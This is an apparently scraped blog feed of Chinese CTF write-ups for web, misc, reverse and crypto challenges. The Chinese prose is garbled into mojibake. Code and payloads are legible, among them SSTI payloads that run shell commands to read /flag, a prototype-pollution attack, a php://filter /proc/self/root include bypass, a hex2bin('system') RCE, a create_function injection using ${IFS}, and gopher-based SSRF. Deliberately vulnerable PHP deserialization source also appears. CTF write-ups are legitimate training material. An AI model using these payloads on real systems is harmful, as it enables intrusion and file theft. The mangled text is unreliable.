alt="image-20220920181636482"></p><h2 id="Text-Reverser"><a href="#Text-Reverser" class="headerlink" title="Text Reverser"></a>Text Reverser</h2><p>SSTIä½†æ˜¯è¿‡æ»¤äº†<code>&#123;&#123;</code>ï¼Œç„¶åè¿˜æŠŠè¾“å…¥çš„å†…å®¹è¿›è¡Œäº†ååºè¾“å‡ºçš„æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„payloadåœ¨è¾“å…¥ä¹‹å‰å°±è¦æœ‰ä¸€ä¸ªååºçš„æ“ä½œ</p><p><code>&#123;&#123;</code>æ²¡äº†å¯ä»¥ç”¨<code>&#123;%%&#125;</code>æ›¿ä»£</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920184914991.png" alt="image-20220920184914991"></p><p>ç…§ç€è¿™ä¸ªpayloadæ”¹ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">&#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read())%&#125;</code></pre><p>æ”¹äº†ä¹‹åçš„payloadä¸º</p><pre class="language-none"><code class="language-none">&#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;nl &#x2F;flag&#39;).read())%&#125;</code></pre><p>ç„¶åé€†åºä¸€ä¸‹</p><pre class="language-none"><code class="language-none">&#125;%))(daer.)&#39;galf&#x2F; ln&#39;(]&#39;nepop&#39;[__slabolg__.__tini__.]231[)(__sessalcbus__.__esab__.__ssalc__.&#39;&#39;(tnirp%&#123;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920185701419.png" alt="image-20220920185701419"></p><h2 id="cbshop"><a href="#cbshop" class="headerlink" title="cbshop"></a>cbshop</h2><p>jsçš„é¢˜ï¼Œæœ‰é™„ä»¶ï¼Œdownä¸‹æ¥å®¡ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯app.jsã€‚</p><p>é¢˜ç›®ä¸»è¦åŠŸèƒ½å°±æ˜¯ç”¨é’±æ¥ä¹°flagï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·åªæœ‰10$ï¼Œä¸å¯èƒ½ä¹°åˆ°11$çš„flagï¼Œè€Œadminç”¨æˆ·æœ‰9999ï¼Œå¯ä»¥ç”¨æ¥è´­ä¹°flagï¼Œäºæ˜¯æˆ‘ä»¬å°±éœ€è¦ç™»å½•adminè´¦å·</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223605085.png" alt="image-20220920223605085"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223623009.png" alt="image-20220920223623009"></p><p>ä»è¿™é‡Œå¯ä»¥å¾—åˆ°å¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223814625.png" alt="image-20220920223814625"></p><p>ç™»å½•ä¹‹åå‘ç°é’±å¤Ÿäº†ä½†è¿˜æ˜¯ä¹°ä¸åˆ°flagã€‚å› ä¸ºæºç é‡Œåœ¨è´­ä¹°çš„éƒ¨åˆ†è¿˜å­˜åœ¨éªŒè¯</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223922197.png" alt="image-20220920223922197"></p><p>productçš„å€¼å°±æ˜¯æˆ‘ä»¬çš„ä¼ å‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224005169.png" alt="image-20220920224005169"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224014603.png" alt="image-20220920224014603"></p><p>ç„¶åå­˜åœ¨ä¸‰ä¸ªifåˆ¤æ–­ï¼Œé¦–å…ˆåˆ¤æ–­idæ˜¯å¦ä¸º2ï¼Œç„¶ååˆ¤æ–­moneyæ˜¯å¦å¤§äº11ï¼Œå¹¶ä¸”æ˜¯å¦å­˜åœ¨ä¸€ä¸ªuser.tokenï¼Œæœ€åä¸€ä¸ªifåˆ¤æ–­æˆ‘ä»¬postä¼ å…¥çš„å†…å®¹æ˜¯å¦æœ‰flagè¿™ä¸ªå…³é”®å­—ï¼Œå¦‚æœæœ‰å°±æç¤ºgo to â€™readFileSyncâ€˜ã€‚å¦‚æœæ²¡æœ‰å°±è¯»å–æ–‡ä»¶åä¸ºnameçš„å€¼çš„æ–‡ä»¶é‡Œé¢çš„å†…å®¹ã€‚</p><p>ç¬¬ä¸€ä¸ªæ¡ä»¶å¥½æ»¡è¶³ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬äºŒä¸ªã€‚é¦–å…ˆæˆ‘ä»¬çŸ¥é“userçš„æ„é€ å¦‚ä¸‹ï¼Œå¹¶æ²¡æœ‰tokenè¿™ä¸ªå±æ€§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224521771.png" alt="image-20220920224521771"></p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³æ·»åŠ ä¸€ä¸ªuser.tokençš„å€¼ï¼Œå°±éœ€è¦å€ŸåŠ©åŸå‹é“¾æ±¡æŸ“ï¼ˆ<a href="https://ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/">jsæ¼æ´ | Ethe&#39;s blog (ethe448.github.io)</a>ï¼‰ã€‚è€Œä»£ç ä¸­æ­£å¥½å­˜åœ¨åˆ©ç”¨çš„åœ°æ–¹ï¼Œè¿™æ˜¯ä¸€ä¸ªè¿›è¡Œå¤åˆ¶æ“ä½œçš„å‡½æ•°ã€‚</p><p><code>    Object.assign(order[user.username], product);</code></p><p>å¦‚æœuser.username=__proto__ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œè¿™æ®µä»£ç çš„æ—¶å€™ï¼Œå°±ä¼šé€ æˆæˆ‘ä»¬çš„åŸå‹é“¾æ±¡æŸ“ã€‚productçš„å€¼æˆ‘ä»¬å¯æ§ã€‚ä¹Ÿå°±å®ç°äº†ä¸ºå…¶æ·»åŠ userå¯¹è±¡æ·»åŠ tokenå±æ€§çš„ç›®çš„</p><p>æ‰€ä»¥é¦–å…ˆæ˜¯æŠŠuser.usernameæ”¹æˆ__proto__</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223520791.png" alt="image-20220920223520791">æ¥ä¸‹æ¥å°±æ˜¯ä¼ å…¥productï¼Œnameçš„å€¼æ˜¯æˆ‘ä»¬æƒ³è¯»çš„æ–‡ä»¶åï¼Œä¹Ÿå°±æ˜¯/flagï¼Œç„¶åæ·»åŠ ä¸€ä¸ªtokenå±æ€§å°±å¯ä»¥ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223407034.png" alt="image-20220920223407034"></p><p>ç”±äºç¬¬ä¸‰ä¸ªifçš„åŸå› ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡ä¼ å‚çš„æ—¶å€™æ˜¯ä¼šè¢«æ‹¦ä¸‹æ¥çš„ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç¬¬äºŒæ¬¡ä¼ å‚ï¼Œå› ä¸ºä¹‹å‰æˆ‘ä»¬ä»¥åŠæŠŠnameçš„å€¼èµ‹æˆäº†/flagï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡ä¼ å‚å°±ä¸å†éœ€è¦äº†ï¼ˆå…¶å®ç¬¬äºŒæ¬¡éšä¾¿ä¼ ä¸ªjsonæ ¼å¼çš„å†…å®¹å°±è¡Œï¼Œåªè¦ä¸è¦†ç›–ç¬¬ä¸€æ¬¡ä¼ çš„å€¼ã€‚ï¼‰ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223342590.png" alt="image-20220920223342590"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¤©å±±å›ºç½‘</title>
      <link href="/2022/06/28/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/"/>
      <url>/2022/06/28/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<p>ä¸ºä»€ä¹ˆæŠ¥åæ˜¯å­¦ç”Ÿç»„æ‰“æ¯”èµ›åˆ†åˆ°äº†ä¼ä¸šç»„æï¼Œä¼ä¸šè¿™ç¾¤äººä¹Ÿå¤ªå·äº†</p><p>ï¼ˆåªæœ‰webæ˜¯æˆ‘åšçš„ï¼Œå…¶ä»–è·Ÿæˆ‘æ²¡å•¥å…³ç³»</p><h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><h2 id="å°è¯•ä¸€ä¸‹è§£å¯†ï¼Ÿ"><a href="#å°è¯•ä¸€ä¸‹è§£å¯†ï¼Ÿ" class="headerlink" title="å°è¯•ä¸€ä¸‹è§£å¯†ï¼Ÿ"></a>å°è¯•ä¸€ä¸‹è§£å¯†ï¼Ÿ</h2><p>urlè§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ciscn2022/image-20220626141958790.png" alt="image-20220626141958790"></p><h2 id="ç®€å•çš„å›¾ç‰‡"><a href="#ç®€å•çš„å›¾ç‰‡" class="headerlink" title="ç®€å•çš„å›¾ç‰‡"></a>ç®€å•çš„å›¾ç‰‡</h2><p>æ‹–è¿›gimpé‡Œçœ‹åˆ°æœ‰ä¸‰ä¸ªå›¾å±‚ï¼Œåˆ å»æœ€ä¸Šè¾¹çš„ä¸€ä¸ªï¼Œå°±èƒ½çœ‹è§flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626160445309.png" alt="image-20220626160445309"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626160608764.png" alt="image-20220626160608764"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>sqlç›²æ³¨ï¼Œå”¯ä¸€çš„é—®é¢˜æ˜¯è¿™é‡Œåªå…è®¸æœ€å¤§æœ‰å››ä¸ªå‚æ•°ï¼Œæ‰€ä»¥åœ¨ç›²æ³¨ç¬¬äº”ä¸ªæ•°æ—¶è¦åˆ å»ç¬¬ä¸€ä¸ª</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626143623880.png" alt="image-20220626143623880"></p><h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>åˆ©ç”¨fileåè®®æŸ¥çœ‹etc/hostsæ–‡ä»¶ï¼Œæ‰¾åˆ°ä¸»æœºçš„ç½‘æ®µ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626143722528.png" alt="image-20220626143722528"></p><p>bpæ‰«ä¸€ä¸‹ï¼Œå‘ç°åœ¨100é‡Œæœ‰å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626144207786.png" alt="image-20220626144207786"></p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨gopheråè®®æŠŠreferer=dasctf.comå¸¦è¿›å»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145210597.png" alt="image-20220626145210597"></p><p>æç¤ºè¦postä¸€ä¸ªå‚æ•°dasctfï¼Œè€Œä¸”è¿™ä¸ªå‚æ•°è¿˜è¦ç­‰äºflag</p><p>é‡æ–°æ„é€ gopherè¯­å¥ï¼Œæœ€ç»ˆå¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145241386.png" alt="image-20220626145241386"></p><h2 id="MagicalType"><a href="#MagicalType" class="headerlink" title="MagicalType"></a>MagicalType</h2><p>robots.txté‡Œæœ‰ä¸ªhint.php,è®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æºç é‡Œæ˜¯äº›htmlä»£ç ï¼Œæ‹–åˆ°æ–‡æ¡£é‡Œæ”¹æˆhtmlæ ¼å¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626151308282.png" alt="image-20220626151308282"></p><p>åˆ©ç”¨æ•°ç»„æº¢å‡ºå’Œfilterä¼ªåè®®è¯»index.phpçš„æ–‡ä»¶å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626153834734.png" alt="image-20220626153834734"></p><p>è§£ç ä¹‹åæ˜¯ä¸ªååºåˆ—åŒ–</p><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);class Evil&#123;    public $flag &#x3D; 1;    public function __wakeup()    &#123;        $this-&gt;flag &#x3D; 0;    &#125;    public function __destruct()    &#123;        if($this-&gt;flag &#x3D;&#x3D; 1)        &#123;            echo(&quot;How you did it?&quot;);            $xux &#x3D; file_get_contents($_GET[&#39;xux&#39;]);            create_function(&quot;&quot;,$xux);        &#125;        else&#123;            die(&quot;nonono&quot;);        &#125;    &#125;&#125;$o &#x3D; $_GET[&#39;o&#39;];if(isset($o))&#123;    unserialize($o);&#125;</code></pre><p>æˆ‘ä»¬è¦åˆ©ç”¨çš„å‡½æ•°å°±ç®—create_functionï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸ªå‘½ä»¤æ³¨å…¥çš„æ¼æ´ã€‚è€Œ$xuxå‚æ•°å¯ä»¥åˆ©ç”¨dataåè®®è¿›è¡Œæ§åˆ¶ï¼Œè‡³äºwakeupçš„ç»•è¿‡å¯ä»¥å°†æœ€å‰é¢çš„Oæ”¹æˆCï¼ˆé™‡åŸæˆ˜å½¹é‡Œè€ƒè¿‡</p><p>ä¹‹åå‘ç°ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç”¨${IFS}ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626153756895.png" alt="image-20220626153756895"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="æ©è€³ç›—é“ƒ"><a href="#æ©è€³ç›—é“ƒ" class="headerlink" title="æ©è€³ç›—é“ƒ"></a>æ©è€³ç›—é“ƒ</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145446137.png" alt="image-20220626145446137"></p><p>å‹ç¼©åŒ…è§£å‹å‡ºæ¥çš„æ”¹æˆpptæ ¼å¼ç„¶åæŠŠå åŠ çš„å›¾å±‚å…¨åˆ äº†</p><h2 id="chrchrchr"><a href="#chrchrchr" class="headerlink" title="chrchrchr"></a>chrchrchr<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626162933197.png" alt="image-20220626162933197"></h2><p>æ„Ÿè§‰åƒèšå‰‘çš„æµé‡ï¼Œèšå‰‘åŠ å¯†çš„æ–¹å¼å°±æ˜¯base64åŠ å¯†ä¹‹åå†åœ¨å‰é¢æ·»å‡ ä½ï¼Œæ‰€ä»¥ä»tcpæµ18å¼€å§‹å¾€åæ‰¾ï¼Œåˆ æ‰å‰ä¸¤ä¸ªå­—ç¬¦å…ˆurlè§£ç å†base64è§£ç ï¼ŒæŠŠå†™å…¥a.txtçš„å†…å®¹æ‹¼èµ·æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626162737108.png" alt="image-20220626162737108"></p><pre class="language-none"><code class="language-none">KJCUMVCRGFJEOZL2JJWE2V2RGNMW2SLXJZLVCM2ONJWGUTLNJZVU2VCBPBHFIZDIJZVFSMCOIRSGQTKHKJVWMUJ5HU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ç„¶åè¿›è¡Œbase32è§£ç ï¼Œå†base64å¾—åˆ°flag</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626163754458.png" alt="image-20220626163754458"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="measyasm"><a href="#measyasm" class="headerlink" title="measyasm"></a>measyasm</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626150259303.png" alt="image-20220626150259303"></p><p>è‡ªå‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626150733844.png" alt="image-20220626150733844"></p><h2 id="PEinM"><a href="#PEinM" class="headerlink" title="PEinM"></a>PEinM</h2><p>æ‹–è¿›idaé‡ŒåŠ¨è°ƒ</p><p>èƒ½çœ‹å‡ºæ¥åœ¨è¿™é‡Œæœ‰ä¸€ä¸ªè¢«é­”æ”¹è¿‡çš„xxtea</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626174638274.png" alt="image-20220626174638274"></p><p>é€†ä¸€ä¸‹è„šæœ¬</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9E377AB9 #define MX (((z&gt;&gt;4^y&lt;&lt;3) + (y&gt;&gt;4^z&lt;&lt;3)) ^ ((sum^y) + (key[p&amp;0xa^e] ^ z)))  unsigned long long Summation(int n, unsigned long long delat)&#123;        unsigned long long sum &#x3D; 0;        for(int i &#x3D; 0; i &lt; 52&#x2F;n+6; i++)                sum +&#x3D; delat;        return sum;&#125;void btea(unsigned long long *v, int n, unsigned long long const key[4])   &#123;                                                          unsigned long long y, z, sum;                                   unsigned p, round, e;                                if (n &gt; 1)             &#123;        round &#x3D; 6 + 52&#x2F;n;                       sum &#x3D; 0;                                z &#x3D; v[n-1];                             do        &#123;            sum +&#x3D; DELTA;                           e &#x3D; (sum &gt;&gt; 2) &amp; 3;                    for (p&#x3D;0; p&lt;n-1; p++)                   &#123;                y &#x3D; v[p+1];                v[p] +&#x3D; MX;                      z &#x3D; v[p];                             &#125;            y &#x3D; v[0];            z &#x3D; v[n-1] +&#x3D; MX;        &#125;        while (--round);    &#125;    else if (n &lt; -1)    &#123;        n &#x3D; -n;        round &#x3D; 6 + 52&#x2F;n;        sum &#x3D; Summation(n, DELTA);         y &#x3D; v[0];        do        &#123;            e &#x3D; (sum &gt;&gt; 2) &amp; 3;            for (p&#x3D;n-1; p&gt;0; p--)            &#123;                z &#x3D; v[p-1];                y &#x3D; v[p] -&#x3D; MX;            &#125;            z &#x3D; v[n-1];            y &#x3D; v[0] -&#x3D; MX;            sum -&#x3D; DELTA;        &#125;        while (--round);    &#125;&#125;int main()&#123;    unsigned long long v[]&#x3D; &#123;0xBD548E45099A220B, 0x50BB9976358C558A, 0x20598FD852017357, 0xDC9B969877F6E8C2, 0xBEC5A96D9ECC6B87, 0x34D1D0E4390DF96D, 0x6796AEADE501CC5D, 0xDC643460C1430B8F, 0x7CA5CE8BE64FE5EE, 0x066B317D2C139F9B&#125;;    unsigned long long const k[]&#x3D; &#123;0x0000000000000052, 0x0000000000000033, 0x0000000000000076, 0x0000000000000045, 0x0000000000000072, 0x0000000000000073, 0x0000000000000033, 0x000000000000005F, 0x0000000000000031, 0x0000000000000053, 0x000000000000005F, 0x0000000000000045, 0x0000000000000061, 0x0000000000000053, 0x0000000000000079, 0x000000000000000A&#125;;    int n &#x3D; 0xa;     btea(v, -n, k);    for(int i &#x3D; 0; i &lt; 8*n; i++)    &#123;        printf(&quot;%c&quot;, ((unsigned char *)&amp;v)[i]);    &#125;    return 0;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626175648015.png" alt="image-20220626175648015"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="rssssa9"><a href="#rssssa9" class="headerlink" title="rssssa9"></a>rssssa9</h2><p>ç…§ç€é¢˜ç›®é€†æ¨è„šæœ¬ï¼Œç”¨sage</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626165422972.png" alt="image-20220626165422972"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626165353341.png" alt="image-20220626165353341"></p><p>äº¤äº†ä¸€ä¸‹ç»“æœä¸å¯¹</p><p>å‘ç°æ˜¯åŠ å¯†çš„æ—¶å€™åœ¨åè¾¹å¡«äº†ç‚¹ä¸œè¥¿</p><p>å†å»æ‰åŠ å¯†é‡ŒåŠ ä¸Šçš„æœ€åé‚£æ®µ123....321å°±è¡Œ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dest0g3 520è¿æ–°èµ›wp</title>
      <link href="/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/"/>
      <url>/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>å’Œwm2020å¹´çš„é¢˜ä¸€æ ·</p><blockquote><p>phpçš„æ–‡ä»¶åŒ…å«æœºåˆ¶æ˜¯å°†å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­ï¼Œå¦‚æœrequire_once(â€˜flag.phpâ€™)ï¼Œincludeçš„æ–‡ä»¶ä¸è¿è¡Œå†é€šè¿‡require_onceåŒ…å«ã€‚<br>é€šè¿‡çŸ¥è¯†ç‚¹ï¼š/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/ï¼Œ/proc/self/root/æ˜¯æŒ‡å‘/çš„ç¬¦å·é“¾æ¥ï¼Œåˆ©ç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ã€‚</p></blockquote><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520133732748.png" alt="image-20220520133732748"></p><p>è§£ç æ‹¿åˆ°flag</p><p><a href="https://www.anquanke.com/post/id/213235#h3-3">phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>åº”è¯¥æ˜¯è¦åˆ©ç”¨æŠ¥é”™è¿›å…¥set_error_handleré‡Œï¼Œä¼ ä¸ªæ•°ç»„å°±æˆåŠŸäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520134227015.png" alt="image-20220520134227015"></p><h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><p>åˆ©ç”¨è¿›åˆ¶ç¼–ç å’Œé€šé…ç¬¦ç»•è¿‡</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">aaa&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;uniq &#x2F;f*&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520135650912.png" alt="image-20220520135650912"></p><h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>ç”¨è¿™ç¯‡æ–‡ç« é‡Œçš„æ–¹æ³•æ”¹æ”¹å°±è¡Œ<a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</a></p><pre class="language-none"><code class="language-none">é¦–å…ˆç”¨%0aç»•è¿‡ç©ºæ ¼çš„è¿‡æ»¤ï¼Œç„¶ååˆ©ç”¨&#123;%%&#125;å’Œsetç»•è¿‡å…³é”®å­—ï¼Œåˆ©ç”¨popå’Œ()|select|string|listå¾—åˆ°ä¸‹åˆ’çº¿ï¼Œæœ€åå°±æ˜¯ç”¨__getitem__æ„é€ ç±»ä¼¼x.__init__.__globals__[&#39;__builtins__&#39;].chr è¿™ç§payloadå¾—åˆ°chrå’Œopenï¼ŒçŒœæµ‹flagåœ¨æ ¹ç›®å½•ä¸‹çš„&#x2F;flagä¸­ï¼Œå°è¯•è¯»å–æœ€ç»ˆpayload</code></pre><pre class="language-python" data-language="python"><code class="language-python">username&#x3D;&#123;%set%0apo&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;%set%0aa&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aini&#x3D;(a,a,dict(in&#x3D;a,it&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0aglo&#x3D;(a,a,dict(gl&#x3D;a,obals&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ageti&#x3D;(a,a,dict(getit&#x3D;a,em&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0abuilt&#x3D;(a,a,dict(bui&#x3D;a,ltins&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%%0aset%0ach&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%set%0achr&#x3D;(x|attr(geti))(ch)%&#125;&#123;%set%0afile&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;%%0aset%0aop&#x3D;dict(ope&#x3D;a,n&#x3D;a)|join%&#125;&#123;%set%0aopen&#x3D;(x|attr(geti))(op)%&#125;&#123;%%0aset%0are&#x3D;dict(re&#x3D;a,ad&#x3D;a)|join%&#125;&#123;%print(open(file)|attr(re)())%&#125;&amp;password&#x3D;x</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521162208161.png" alt="image-20220521162208161"></p><h2 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);function waf($data)&#123;    if (is_array($data))&#123;        die(&quot;Cannot transfer arrays&quot;);    &#125;    if (preg_match(&#39;&#x2F;get|air|tree|apple|banana|php|filter|base64|rot13|read|data&#x2F;i&#39;, $data)) &#123;        die(&quot;You can&#39;t do&quot;);    &#125;&#125;class air&#123;    public $p;    public function __set($p, $value) &#123;        $p &#x3D; $this-&gt;p-&gt;act;        echo new $p($value);    &#125;&#125;class tree&#123;    public $name;    public $act;    public function __destruct() &#123;        return $this-&gt;name();    &#125;    public function __call($name, $arg)&#123;        $arg[1] &#x3D;$this-&gt;name-&gt;$name;    &#125;&#125;class apple &#123;    public $xxx;    public $flag;    public function __get($flag)    &#123;        $this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag;    &#125;&#125;class D &#123;    public $start;    public function __destruct()&#123;        $data &#x3D; $_POST[0];        if ($this-&gt;start &#x3D;&#x3D; &#39;w&#39;) &#123;            waf($data);            $filename &#x3D; &quot;&#x2F;tmp&#x2F;&quot;.md5(rand()).&quot;.jpg&quot;;            file_put_contents($filename, $data);            echo $filename;        &#125; else if ($this-&gt;start &#x3D;&#x3D; &#39;r&#39;) &#123;            waf($data);            $f &#x3D; file_get_contents($data);            if($f)&#123;                echo &quot;It is file&quot;;            &#125;            else&#123;                echo &quot;You can look at the others&quot;;            &#125;        &#125;    &#125;&#125;class banana &#123;    public function __get($name)&#123;        return $this-&gt;$name;    &#125;&#125;&#x2F;&#x2F; flag in &#x2F;if(strlen($_POST[1]) &lt; 55) &#123;    $a &#x3D; unserialize($_POST[1]);&#125;else&#123;    echo &quot;str too long&quot;;&#125;throw new 